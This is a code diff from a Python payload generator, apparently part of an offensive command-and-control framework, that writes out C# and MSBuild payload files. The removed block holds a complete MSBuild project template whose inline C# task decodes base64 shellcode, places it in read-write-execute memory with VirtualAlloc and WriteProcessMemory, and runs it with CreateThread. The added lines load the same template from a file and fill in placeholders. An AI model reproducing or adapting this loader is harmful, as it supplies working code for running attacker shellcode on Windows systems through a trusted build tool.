@@ -500,52 +500,18 @@ End Sub
       content = f.read()
     ccode = content.replace("#REPLACEME32#",x86base64)
     ccode = ccode.replace("#REPLACEME64#",x64base64)
-    filename = "%scsc.cs" % (self.BaseDirectory)
+    filename = "%s%scsc.cs" % (self.BaseDirectory,name)
     output_file = open(filename, 'w')
     output_file.write(ccode)
     output_file.close()
     self.QuickstartLog( "" )
     self.QuickstartLog( "CSC file written to: %s%scsc.cs" % (self.BaseDirectory,name) )
-
+    with open("%smsbuild.xml" % FilesDirectory, 'rb') as f:
+      msbuild = f.read()
     projname = randomuri()
-
-    msbuild="""<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
- <Target Name="%s">
- <%s />
- </Target>
- <UsingTask
- TaskName="%s"
- TaskFactory="CodeTaskFactory"
- AssemblyFile="C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll" >
- <Task>
- <Code Type="Class" Language="cs">
- <![CDATA[
-using System;using System.Diagnostics;using System.Runtime.InteropServices;using Microsoft.Build.Framework;using Microsoft.Build.Utilities;
-public class %s : Task, ITask
-{
-private static UInt32 MEM_COMMIT = 0x1000;private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
-[DllImport("kernel32")]private static extern IntPtr VirtualAlloc(UInt32 lpStartAddr,UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
-[DllImport("kernel32")]private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);
-[DllImport("kernel32")]private static extern IntPtr CreateThread(UInt32 lpThreadAttributes,UInt32 dwStackSize,IntPtr lpStartAddress,IntPtr param,UInt32 dwCreationFlags,ref UInt32 lpThreadId);
-[DllImport("kernel32")]private static extern UInt32 WaitForSingleObject(IntPtr hHandle,UInt32 dwMilliseconds);
-public override bool Execute()
-{
-string pw = "%s";
-string sc32 = "%s";
-string sc64 = "%s";
-byte[] sc = null;
-if (IntPtr.Size == 4){sc = System.Convert.FromBase64String(sc32);} else {sc = System.Convert.FromBase64String(sc64);}
-IntPtr funcAddr = VirtualAlloc(0, (UInt32)sc.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE); 
-Process t = Process.GetProcessById(Process.GetCurrentProcess().Id);IntPtr bw = IntPtr.Zero;
-bool resultBool = WriteProcessMemory(t.Handle,funcAddr,sc,sc.Length, out bw);
-IntPtr hThread = IntPtr.Zero;UInt32 threadId = 0;hThread = CreateThread(0, 0, funcAddr, IntPtr.Zero, 0, ref threadId);WaitForSingleObject(hThread, 0xFFFFFFFF);
-return true;}}
- ]]>
- </Code>
- </Task>
- </UsingTask>
- </Project>
-""" % (projname,projname,projname,projname,projname,x86base64,x64base64)
+    msbuild = msbuild.replace("#REPLACEME32#",x86base64)
+    msbuild = msbuild.replace("#REPLACEME64#",x64base64)
+    msbuild = msbuild.replace("#REPLACEMERANDSTRING#",projname)
     self.QuickstartLog( "Msbuild file written to: %s%smsbuild.xml" % (self.BaseDirectory,name) )
     filename = "%s%smsbuild.xml" % (self.BaseDirectory,name)
     output_file = open(filename, 'w')
